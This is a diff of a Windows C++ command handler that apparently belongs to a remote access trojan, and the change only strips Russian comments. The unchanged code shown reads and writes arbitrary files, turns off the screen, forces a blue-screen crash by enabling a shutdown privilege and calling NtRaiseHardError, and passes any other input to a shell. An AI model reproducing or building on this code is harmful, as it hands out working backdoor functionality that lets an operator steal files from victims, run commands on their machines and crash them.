@@ -149,7 +149,6 @@ static std::string HandleSpecial(const std::string& cmdIn, std::string& extra) {
     std::string cmd = cmdIn;
     while (!cmd.empty() && cmd.back() == ' ') cmd.pop_back();
 
-    // --- файлы ---
     if (cmd.rfind("get ", 0) == 0) {
         std::string path = cmd.substr(4);
         std::string data = ReadFile(path);
@@ -166,8 +165,6 @@ static std::string HandleSpecial(const std::string& cmdIn, std::string& extra) {
         WriteFileRaw(path, raw);
         return "[+] wrote " + std::to_string(raw.size()) + " bytes to " + path;
     }
-
-    // --- управление экраном / системой ---
     if (cmd == "screen_off") {
         SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
         return "[+] screen off";
@@ -301,7 +298,6 @@ static std::string HandleSpecial(const std::string& cmdIn, std::string& extra) {
         return "[+] party done";
     }
     if (cmd == "bsod") {
-        // требует SeShutdownPrivilege — обычно есть у пользователя
         typedef LONG (WINAPI *pNtRaiseHardError)(LONG, ULONG, ULONG,
             PVOID, ULONG, PULONG);
         typedef LONG (WINAPI *pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
@@ -311,7 +307,7 @@ static std::string HandleSpecial(const std::string& cmdIn, std::string& extra) {
             auto NtErr  = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
             if (RtlAdj && NtErr) {
                 BOOLEAN old;
-                RtlAdj(19, TRUE, FALSE, &old);   // SeShutdownPrivilege
+                RtlAdj(19, TRUE, FALSE, &old);
                 ULONG resp;
                 NtErr(0xC0000005, 0, 0, nullptr, 6, &resp);
             }
@@ -349,8 +345,6 @@ static std::string HandleSpecial(const std::string& cmdIn, std::string& extra) {
                       nullptr, nullptr, SW_SHOW);
         return "[+] opened";
     }
-
-    // обычная cmd-команда
     return RunCmd(cmd);
 }
 
